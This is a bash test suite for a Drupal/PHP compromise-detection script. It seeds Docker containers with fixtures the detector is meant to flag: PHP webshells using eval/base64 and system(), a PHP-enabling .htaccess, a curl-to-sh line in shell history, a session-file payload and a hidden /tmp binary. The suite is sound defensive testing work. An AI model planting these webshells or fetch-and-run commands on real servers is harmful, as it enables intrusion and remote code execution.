#!/usr/bin/env bash
# run-tests.sh - end-to-end tests for strider.sh without touching Upsun.
#
# Each scenario is a throwaway docker container (ddev's webserver image, which has PHP) that
# stands in for an Upsun app container: logs in /var/log, PHP sessions, a files/ mount under
# /app. tests/bin/upsun replaces the Upsun CLI and routes `upsun ssh` into the container.
#
# Usage: tests/run-tests.sh            (needs docker)
#        STRIDER_KEEP=1 tests/run-tests.sh   keep the reports to look at
#        STRIDER_TEST_IMAGE=... tests/run-tests.sh

set -o pipefail

HERE=$(cd "$(dirname "$0")" && pwd)
STRIDER="$HERE/../strider.sh"
IMAGE="${STRIDER_TEST_IMAGE:-ddev/ddev-webserver:v1.25.4}"
WORK=$(mktemp -d "${TMPDIR:-/tmp}/strider-tests.XXXXXX")
SCENARIOS="clean compromised trimmed nologs althost"
FAILS=0

cleanup() {
  for s in $SCENARIOS; do
    # The container runs as root, so hand the bind-mounted files back before removing it.
    docker exec "strider-test-$s" chown -R "$(id -u):$(id -g)" /app/web/sites/default/files /app/private /srv/www/web/sites/default/files >/dev/null 2>&1
    docker rm -f "strider-test-$s" >/dev/null 2>&1
  done
}
trap cleanup EXIT
cleanup

ok()   { echo "  PASS  $1"; }
fail() { echo "  FAIL  $1"; FAILS=$((FAILS + 1)); }

# --- fixtures ---------------------------------------------------------------
# nginx combined format, as Upsun writes /var/log/access.log
req() { printf '%s - - [%s +0000] "%s HTTP/1.1" %s %s "-" "Mozilla/5.0"\n' "$1" "$2" "$3" "$4" "${5:-1024}"; }

normal_traffic() {   # $1 = first day of October to start on
  for d in $(seq "$1" 22); do
    for h in 03 09 14 20; do
      req 198.51.100.$((d % 7 + 10)) "$d/Oct/2026:$h:00:00" "GET / " 200
      req 198.51.100.$((d % 5 + 20)) "$d/Oct/2026:$h:05:00" "GET /node/12" 200
      req 203.0.113.$((d % 3 + 1))   "$d/Oct/2026:$h:10:00" "GET /events?page=2" 200
    done
    req 198.51.100.40 "$d/Oct/2026:11:00:00" "POST /user/login" 303
  done
  req 198.51.100.41 "19/Oct/2026:12:00:00" "POST /node/add/article" 500
}

near_miss_traffic() {   # POST activity just under the burst rule; must not flag
  for m in 00 03 06 09; do req 198.51.100.50 "20/Oct/2026:10:$m:00" "POST /user/login" 303; done            # 4 in 10 minutes
  for m in 00 03 06 09 12; do req 198.51.100.51 "20/Oct/2026:12:$m:00" "POST /contact?x=$m" 303; done      # 5, spread over 12 minutes
  for p in /a /b /c /d /e; do req 198.51.100.52 "20/Oct/2026:14:01:00" "POST $p" 303; done                 # 5, different pages
}

attack_traffic() {
  # Amazon-published source IP, multipart-looking PUT/PATCH, a burst of POSTs to the front page.
  for m in 01 02 03 04 05 06; do
    req 37.19.200.5 "21/Oct/2026:04:$m:00" "POST /" 502 0
  done
  req 37.19.200.5   "21/Oct/2026:04:07:00" "PUT /node/1" 500 0
  req 37.19.200.5   "21/Oct/2026:04:08:00" "PATCH /jsonapi/node/article/1" 500 0
  req 192.0.2.66    "21/Oct/2026:04:09:00" "POST /?PHP_SESSION_UPLOAD_PROGRESS=x" 200
  req 192.0.2.66    "21/Oct/2026:04:10:00" "GET /sites/default/files/x.php?c=id" 200
}

start() {   # $1 = scenario
  mkdir -p "$WORK/$1/files" "$WORK/$1/private"
  docker run -d --name "strider-test-$1" --no-healthcheck --entrypoint sleep -e PLATFORM_APP_DIR=/app \
    -v "$WORK/$1/files:/app/web/sites/default/files" -v "$WORK/$1/private:/app/private" "$IMAGE" infinity >/dev/null || return 1
  docker exec "strider-test-$1" sh -c 'mkdir -p /app/web/core /var/lib/php/sessions && echo "<?php // index" > /app/web/index.php && touch -d "2026-10-01 00:00Z" /app/web/index.php'
}
put() {   # $1 = scenario, $2 = path in container; content on stdin
  docker exec -i "strider-test-$1" sh -c "mkdir -p \"\$(dirname '$2')\" && cat > '$2'"
}
stamp() { docker exec "strider-test-$1" touch -d "$3" "$2"; }

# A stand-in drush that answers strider.sh's queries from files in /app/.fake-drush:
#   installed (uid 1 created), users.tsv / admins.tsv (uid name mail status created changed), modules.
FAKE_DRUSH=$(cat <<'DRUSH'
#!/bin/sh
D=/app/.fake-drush
since() { echo "$1" | sed -n 's/.*>= \([0-9]*\).*/\1/p'; }
case "$*" in
  "status --field=bootstrap") echo Successful ;;
  "status --field=drupal-version") echo 11.4.7 ;;
  "status --field=root") echo /app/web ;;
  php:eval*) echo ../config/sync ;;
  *"WHERE uid = 1"*) cat $D/installed ;;
  *"COUNT(*)"*) awk '$1 > 0' $D/users.tsv | wc -l ;;
  *"FROM users_field_data WHERE created"*) awk -F'\t' -v b="$(since "$*")" '$5 >= b || $6 >= b' $D/users.tsv ;;
  *"FROM user__roles"*) cut -f1-3,5,6 $D/admins.tsv ;;
  pm:list*) cat $D/modules ;;
  config:status*) echo " [notice] No differences between DB and sync directory." ;;
  *) exit 1 ;;
esac
DRUSH
)
INSTALLED=$(date -u -d '2026-10-21 17:51:42Z' +%s)
fake_drupal() {   # $1 = scenario; users.tsv, admins.tsv and modules on stdin, separated by lines of "--"
  printf '%s\n' "$FAKE_DRUSH" | put "$1" /usr/local/bin/drush
  docker exec "strider-test-$1" chmod +x /usr/local/bin/drush
  echo "$INSTALLED" | put "$1" /app/.fake-drush/installed
  awk -v d="strider-test-$1" 'BEGIN {f[0] = "users.tsv"; f[1] = "admins.tsv"; f[2] = "modules"} /^--$/ {i++; next} {print > ("/dev/stdout"); print f[i] "\t" $0 > "/dev/stderr"}' 2>"$WORK/$1.drupal" >/dev/null
  for f in users.tsv admins.tsv modules; do
    grep "^$f	" "$WORK/$1.drupal" | cut -f2- | put "$1" "/app/.fake-drush/$f"
  done
  printf 'module:\n  node: 0\n  user: 0\n  trash: 0\ntheme:\n  claro: 0\n' | put "$1" /app/config/sync/core.extension.yml
}
# Accounts from the site install on 21 Oct, as on a freshly built environment.
INSTALL_USERS="0		-	0	$INSTALLED	$INSTALLED
1	admin	admin@example.com	1	$INSTALLED	$INSTALLED
3	editor	-	1	$((INSTALLED + 146))	$((INSTALLED + 146))"
INSTALL_ADMINS="1	admin	admin@example.com	1	$INSTALLED	$INSTALLED
3	editor	-	1	$((INSTALLED + 146))	$((INSTALLED + 146))"

setup_clean() {
  start clean || return 1
  { normal_traffic 14; near_miss_traffic; } | sort -t[ -k2 | put clean /var/log/access.log
  printf '2026-10-18T10:00:00Z GET 200 12.0 ms 4096 kB 40.00%% /\n' | put clean /var/log/php.access.log
  printf '[19-Oct-2026 12:00:00 UTC] PHP Fatal error:  Allowed memory size of 268435456 bytes exhausted\n%.0s' 1 2 | put clean /var/log/php.log
  : | put clean /var/log/app.log
  # Twig's compiled templates are PHP files in files/ and change constantly; must not flag.
  echo '<?php /* twig */ class __TwigTemplate_abc {}' | put clean /app/web/sites/default/files/php/twig/68f_page.html.twig_X/HUahq2bIbIkW2GaTzAnI5F7EpODLQc0SUhAhI4kSmlQ.php
  echo '<?php class Drupal__node__NodeStorageTrash6ad8 extends \Drupal\node\NodeStorage {}' | put clean /app/private/trash/Drupal__node__NodeStorageTrash6ad8/7rPMVf0yTeSzV8U7IeeiD7kPVAA75S7Lyh-PGF4i1Lo.php
  printf '# Deny all requests from Apache 2.4+.\n<IfModule mod_authz_core.c>\n  Require all denied\n</IfModule>\n<IfModule !mod_authz_core.c>\n  Deny from all\n</IfModule>\nOptions -Indexes -ExecCGI -Includes -MultiViews\nSetHandler Drupal_Security_Do_Not_Remove_See_SA_2006_006\n<Files *>\n  SetHandler Drupal_Security_Do_Not_Remove_See_SA_2013_003\n</Files>\n<IfModule mod_php.c>\n  php_flag engine off\n</IfModule>\n' | put clean /app/private/trash/.htaccess
  echo 'Deny from all' | put clean /tmp/package_manager_composer_home-92acfb63/.htaccess
  # Team shell history, touched at login as Upsun does; ordinary admin commands must not flag.
  printf 'cd web\ndrush uli\ncrontab -l\ncat ~/.ssh/authorized_keys\nphp -v\n' | put clean /tmp/.bash_history
  docker exec strider-test-clean sh -c ': > /tmp/.psql_history'
  printf '%s\n--\n%s\n--\nnode\nuser\ntrash\n' "$INSTALL_USERS" "$INSTALL_ADMINS" | fake_drupal clean
  echo 'image' | put clean /app/web/sites/default/files/2026-10/photo.jpg
  echo '_sf2_meta|a:0:{}' | put clean /var/lib/php/sessions/sess_k3j4h5g6f7d8s9a0q1w2e3r4t5
}

setup_compromised() {
  start compromised || return 1
  { normal_traffic 14; attack_traffic; } | sort -t[ -k2 | put compromised /var/log/access.log
  : | put compromised /var/log/php.access.log
  {
    for i in 1 2 3; do echo "[21-Oct-2026 04:0$i:00] WARNING: [pool web] child 10$i exited on signal 11 (SIGSEGV) after 0.3 seconds from start"; done
    for i in $(seq 1 25); do echo "[21-Oct-2026 04:05:$((i + 10))] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted"; done
  } | put compromised /var/log/app.log
  : | put compromised /var/log/php.log
  echo '<?php @eval(base64_decode($_POST["c"])); ?>' | put compromised /app/web/sites/default/files/x.php
  stamp compromised /app/web/sites/default/files/x.php "2026-10-21 04:10Z"
  printf 'AddType application/x-httpd-php .jpg\nRequire all granted\n' | put compromised /app/web/sites/default/files/.htaccess
  LATER=$(date -u -d '2026-10-22 03:00Z' +%s)
  printf '%s\n4\tsupport\tx@example.net\t1\t%s\t%s\n--\n%s\n4\tsupport\tx@example.net\t1\t%s\t%s\n--\nnode\nuser\ntrash\nphp\n' \
    "$INSTALL_USERS" "$LATER" "$LATER" "$INSTALL_ADMINS" "$LATER" "$LATER" | fake_drupal compromised
  printf 'cd /tmp\ncurl -s http://203.0.113.9/x.sh | sh\n' | put compromised /tmp/.bash_history
  echo 'upload_progress_x|a:1:{s:4:"evil";s:19:"<?php system("id"); ";}' | put compromised /var/lib/php/sessions/sess_k3j4h5g6f7d8s9a0q1w2e3r4t5
  echo 'x' | put compromised /var/lib/php/sessions/sess_short   # malformed session ID
  # A dropped binary running from /tmp under a hidden name.
  docker exec "strider-test-compromised" sh -c 'cp /bin/sleep /tmp/.kworker && (nohup /tmp/.kworker 3600 >/dev/null 2>&1 &)'
}

setup_trimmed() {
  start trimmed || return 1
  normal_traffic 20 | put trimmed /var/log/access.log   # starts 20 Oct, window starts 17 Oct
  : | put trimmed /var/log/app.log
}

# A different host, described by tests/althost.conf: app root in $SITE_ROOT, logs in /srv/logs.
setup_althost() {
  mkdir -p "$WORK/althost/files"
  docker run -d --name strider-test-althost --no-healthcheck --entrypoint sleep -e SITE_ROOT=/srv/www \
    -v "$WORK/althost/files:/srv/www/web/sites/default/files" "$IMAGE" infinity >/dev/null || return 1
  { normal_traffic 14; attack_traffic; } | sort -t[ -k2 | put althost /srv/logs/access.log
  for i in 1 2 3; do echo "[21-Oct-2026 04:0$i:00] WARNING: [pool www] child 20$i exited on signal 11 (SIGSEGV)"; done | put althost /srv/logs/php-errors.log
  echo '<?php system($_GET["c"]); ?>' | put althost /srv/www/web/sites/default/files/up.php
  stamp althost /srv/www/web/sites/default/files/up.php "2026-10-21 04:12Z"
}

setup_nologs() {
  start nologs || return 1
}

# --- run ----------------------------------------------------------------------
docker image inspect "$IMAGE" >/dev/null 2>&1 || { echo "docker image $IMAGE not found (set STRIDER_TEST_IMAGE)"; exit 1; }
for s in $SCENARIOS; do "setup_$s" || { echo "setup of $s failed"; exit 1; }; done

# Runs strider.sh for one project in its own folder; prints the folder.
run_strider() {   # $1 = label, then strider args
  local d="$WORK/run-$1"; shift
  mkdir -p "$d"
  (cd "$d" && PATH="$HERE/bin:$PATH" "$STRIDER" -f 2026-10-17T00:00:00 "$@" > stdout.txt 2>&1)
  echo "$d"/ithildin-report-*
}
status_of() { grep -A1 "^\[$2\]" "$1/SUMMARY.txt" | sed -n 2p; }
expect_status() {   # $1 = report, $2 = project, $3 = OK|REVIEW|INCOMPLETE
  st=$(status_of "$1" "$2")
  case $st in "    $3"*) ok "$2 is $3" ;; *) fail "$2 should be $3, got: ${st:-(no line)}" ;; esac
}
expect_flag() {   # $1 = report, $2 = project, $3 = flag substring
  status_of "$1" "$2" | grep -qF -- "$3" && ok "$2 flags $3" || fail "$2 should flag $3: $(status_of "$1" "$2")"
}
expect_no_flag() {
  status_of "$1" "$2" | grep -qF -- "$3" && fail "$2 should not flag $3: $(status_of "$1" "$2")" || ok "$2 does not flag $3"
}
expect_line() {   # $1 = file, $2 = fixed string, $3 = description
  grep -qF -- "$2" "$1" && ok "$3" || fail "$3 (no '$2' in ${1##*/})"
}

echo "clean site (PHP treated as patched)"
R=$(STRIDER_FIXED_VERSIONS=8.4.24 run_strider clean -p clean)
expect_status "$R" clean OK
expect_line "$R/RESULT.txt" "all 1 apps OK" "clean run says all OK"
expect_no_flag "$R" clean "POST-BURSTS"
expect_line "$R/SUMMARY.txt" "memory-errors=2" "a couple of memory errors are only a note"
expect_no_flag "$R" clean "php-in-files"
expect_no_flag "$R" clean "files="
expect_no_flag "$R" clean "shell-history"
expect_line "$R/report.html" "shell history commands for downloaders" "checks table counts shell history"
expect_line "$R/report.html" "<b class=\"o\">No matches.</b>" "known-IP row leads with its outcome"
expect_no_flag "$R" clean "drupal-admins-changed"
expect_no_flag "$R" clean "modules-not-in-config"
expect_line "$R/clean-main/container.txt" "7rPMVf0yTeSzV8U7IeeiD7kPVAA75S7Lyh-PGF4i1Lo.php" "Drupal PHP storage listed as generated"
expect_line "$R/clean-main/container.txt" "Site installed 2026-10-21T17:51:42Z" "site install recognised"
expect_line "$R/report.html" "No trace of the exploit on the 1 app checked" "report.html says all OK"
expect_line "$R/report.html" "<title>Ithildin report</title>" "report is titled Ithildin"
expect_line "$R/report.html" '<h1 class="site">Test site clean</h1>' "site name is the h1"
expect_line "$R/report.html" "environment <b>main</b>" "h1 block names the environment"
expect_line "$R/report.html" "What we checked" "report shows what was checked"
expect_line "$R/report.html" "requests from" "checks table counts requests"
grep -q 'res flag\|res skip' "$R/report.html" && fail "clean report has a flagged or skipped check" || ok "every check in the clean report is Clean"
expect_line "$R/report.html" "access-log entries read" "evidence strip present"
expect_line "$R/report.html" '<div class="todo">' "hardening shown in its own to-do box"
expect_line "$R/report.html" 'id="egg"' "moon-letter easter egg present"
[ -f "$(dirname "$R")/latest/report.html" ] && ok "latest link opens the report" || fail "latest/report.html missing"
expect_line "$R/report.html" "2 hardening steps to do" "hardening banner under the verdict"
expect_line "$R/report.html" "session.upload_progress.enabled: 0" "to-do box has the config to paste"

echo "clean site on the image's real PHP 8.4.24 (fixed is 8.4.27)"
R=$(run_strider unpatched -p clean)
expect_status "$R" clean REVIEW
expect_flag "$R" clean PHP-UNPATCHED
expect_line "$R/SUMMARY.txt" "NOT PATCHED" "summary says NOT PATCHED"

echo "compromised site"
R=$(STRIDER_FIXED_VERSIONS=8.4.24 run_strider compromised -p compromised)
expect_status "$R" compromised REVIEW
for f in shell-history=1 drupal-admins-changed=1 modules-not-in-config=1 KNOWN-IPS= PUT/PATCH=2 POST-BURSTS=1 UPLOAD-PROGRESS-FIELD=1 CRASHES=3 MEMORY-ERRORS=25 \
         session-files= files= php-in-files=1 shells=1 tmp-exe=1 procs=; do
  expect_flag "$R" compromised "$f"
done
expect_line "$R/RESULT.txt" "1 to review" "result line counts the review"
expect_line "$R/compromised-main/container.txt" "/app/web/sites/default/files/.htaccess" "malicious .htaccess is counted"
expect_line "$R/report.html" "Webshell-like code" "report.html explains the webshell"
expect_line "$R/report.html" '<span class="res flag">Flagged</span>' "checks table marks flagged checks"
expect_line "$R/report.html" "&lt;?php @eval" "report.html escapes evidence"
grep -qF '<?php @eval' "$R/report.html" && fail "report.html has unescaped evidence" || ok "no unescaped evidence in report.html"

echo "access log trimmed by Upsun"
R=$(STRIDER_FIXED_VERSIONS=8.4.24 run_strider trimmed -p trimmed)
expect_status "$R" trimmed INCOMPLETE
expect_flag "$R" trimmed LOGS-TRIMMED

echo "no access log"
R=$(STRIDER_FIXED_VERSIONS=8.4.24 run_strider nologs -p nologs)
expect_status "$R" nologs INCOMPLETE
expect_flag "$R" nologs NO-ACCESS-LOG

echo "seed-upsun.sh canaries on a clean site"
PATH="$HERE/bin:$PATH" "$HERE/seed-upsun.sh" -p clean -e test > "$WORK/seed.txt" 2>&1
expect_line "$WORK/seed.txt" "planted" "seed planted canaries"
R=$(STRIDER_FIXED_VERSIONS=8.4.24 run_strider seeded -p clean -e test)
expect_status "$R" clean REVIEW
for f in files= php-in-files=1 shells=1 session-files= tmp-exe=1 procs=1; do expect_flag "$R" clean "$f"; done
PATH="$HERE/bin:$PATH" "$HERE/seed-upsun.sh" -p clean -e test --clean > "$WORK/unseed.txt" 2>&1
R=$(STRIDER_FIXED_VERSIONS=8.4.24 run_strider unseeded -p clean -e test)
expect_status "$R" clean OK

echo "another host via -c tests/althost.conf"
R=$(STRIDER_FIXED_VERSIONS=8.4.24 run_strider althost -c "$HERE/althost.conf")
expect_status "$R" althost REVIEW
for f in CRASHES=3 POST-BURSTS=1 php-in-files=1 shells=1; do expect_flag "$R" althost "$f"; done
expect_line "$R/report.html" "Acme Hosting project althost" "report names the configured host"
expect_line "$R/report.html" '<h1 class="site">Acme test site</h1>' "title comes from the config"
expect_line "$R/report.html" 'href="althost-live/php-errors.log"' "configured error log is saved and linked"
expect_line "$R/althost-live/container.txt" "### /srv/logs" "configured log dir is listed"
expect_line "$R/althost-live/container.txt" "/srv/www/web/sites/default/files/up.php" "app root comes from SITE_ROOT"
expect_line "$R/report.html" "the PHP settings in the Acme control panel" "hardening hint comes from the config"
[ -s "$R/althost-live/php.access.log" ] && fail "empty PHP_ACCESS_LOG should skip that log" || ok "empty PHP_ACCESS_LOG skips that log"

echo "local.conf: copied logs on this machine (logs only)"
L="$WORK/localsite"; mkdir -p "$L"
{ normal_traffic 14; attack_traffic; } | sort -t[ -k2 > "$L/access.log"
for i in 1 2 3; do echo "[21-Oct-2026 04:0$i:00] WARNING: [pool web] child 10$i exited on signal 11 (SIGSEGV)"; done > "$L/app.log"
(cd "$L" && env -u DDEV_SITENAME STRIDER_FIXED_VERSIONS=8.4.24 "$STRIDER" -c "$HERE/../local.conf" > stdout.txt 2>&1)
R=$(echo "$L"/ithildin-report-*)
expect_status "$R" localsite REVIEW
for f in KNOWN-IPS= POST-BURSTS=1 CRASHES=3 "also incomplete: LOGS-ONLY"; do expect_flag "$R" localsite "$f"; done
expect_line "$R/report.html" "Logs-only run" "report says only logs were read"
L2="$WORK/localclean"; mkdir -p "$L2"; normal_traffic 14 > "$L2/access.log"
(cd "$L2" && env -u DDEV_SITENAME "$STRIDER" -c "$HERE/../local.conf" > stdout.txt 2>&1)
R=$(echo "$L2"/ithildin-report-*)
expect_status "$R" localclean INCOMPLETE
expect_flag "$R" localclean LOGS-ONLY

echo "local.conf inside a ddev-like container (full checks)"
docker exec strider-test-clean mkdir -p /opt/ithildin /work
docker cp -q "$STRIDER" strider-test-clean:/opt/ithildin/strider.sh
docker cp -q "$HERE/../local.conf" strider-test-clean:/opt/ithildin/local.conf
docker exec strider-test-clean sh -c 'cp /var/log/*.log /work/'
docker exec -w /work -e DDEV_SITENAME=clean -e DDEV_APPROOT=/app -e STRIDER_FIXED_VERSIONS=8.4.24 strider-test-clean \
  bash /opt/ithildin/strider.sh -c /opt/ithildin/local.conf > "$WORK/inddev.txt" 2>&1
docker exec strider-test-clean sh -c 'cat /work/latest/SUMMARY.txt' > "$WORK/inddev-summary.txt"
grep -A1 '^\[clean\]' "$WORK/inddev-summary.txt" | grep -q '^    OK' && ok "full local run inside the container is OK" || fail "inside-container run: $(grep -A1 '^\[clean\]' "$WORK/inddev-summary.txt" | tail -1)"
expect_line "$WORK/inddev-summary.txt" "PHP 8.4.24 (patched)" "inside the container the PHP version is checked"

echo "missing config"
(cd "$WORK" && "$STRIDER" -c /nonexistent.conf > missing.txt 2>&1)
expect_line "$WORK/missing.txt" "config file not found" "a missing config stops the run"

echo "unreachable environment"
R=$(STRIDER_FIXED_VERSIONS=8.4.24 run_strider unreachable -p unreachable)
expect_line "$R/SUMMARY.txt" "[unreachable] INCOMPLETE: could not connect" "unreachable project is INCOMPLETE"
expect_line "$R/report.html" "Could not connect" "report.html shows the connection failure"
grep -q "What we checked" "$R/report.html" && fail "unreachable app should have no checks table" || ok "unreachable app has no checks table"

echo
cleanup; trap - EXIT
if [ "$FAILS" -eq 0 ]; then echo "All tests passed."; else echo "$FAILS test(s) failed."; fi
if [ "$FAILS" -eq 0 ] && [ -z "$STRIDER_KEEP" ]; then rm -rf "$WORK"; else echo "Reports kept in $WORK (open run-*/ithildin-report-*/report.html)"; fi
exit $((FAILS > 0))
